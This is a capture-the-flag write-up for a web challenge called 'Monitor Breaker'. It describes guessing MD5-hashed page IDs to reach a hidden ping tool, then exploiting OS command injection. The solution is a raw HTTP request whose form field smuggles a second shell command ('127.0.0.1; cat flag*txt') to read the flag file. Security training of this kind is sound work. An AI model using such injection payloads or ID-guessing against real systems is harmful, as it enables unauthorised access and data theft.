#### Monitor Breaker
- points earned: 10
#### Where's the flag?
- There was no source code provided with this challenge so flag location is unknown.
#### Notes / Intuition
- At first glance the web app looks like a static app.  There are 3 links where 2 of them lead to static pages.
- The 2 links are in the format of `/_sys/c4ca4238a0b923820dcc509a6f75849b` where the 2nd part looks like an md5 hash.
- I used `crackstation.net` with the hashes on both links and they cracked to `1` and `2`.
- At this point I began writing a script to fuzz IDOR, but in testing I found that hash `0` to `cfcd208495d565ef66e7dff9f98764da`.
- Navigating to `/_sys/c4ca4238a0b923820dcc509a6f75849b` loads a page which seems to be a ping tool.  Anytime I see something like my mind instantly goes to 'how does this work?' and `is this just using bash ping?`
- I first entered `127.0.0.1` to have the tool ping localhost but when I ran it a result was returned that indicated ping is not installed.  This confirms that this is just a shell command.
- I then tried `127.0.0.1; echo meow` and could see the word `meow` in the response.  This confirm command injection.  From here it's just a matter of finding and reading the flag.

#### Solution
```http
POST /_sys/cfcd208495d565ef66e7dff9f98764da HTTP/1.1
Host: monitor-breaker-9134cac6-6513-4c79-a500-df49a5c5435a.ctf.ritsec.club
Content-Length: 249
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBvX8JmlSAiFSf3uK
Cookie: b22cdf09f2a082f582b85282b990c8e7=cdaa483baeb0f65424383b2f3975463e

------WebKitFormBoundaryBvX8JmlSAiFSf3uK
Content-Disposition: form-data; name="target"

127.0.0.1; cat flag*txt
------WebKitFormBoundaryBvX8JmlSAiFSf3uK
Content-Disposition: form-data; name="command_type"

ping
------WebKitFormBoundaryBvX8JmlSAiFSf3uK--
```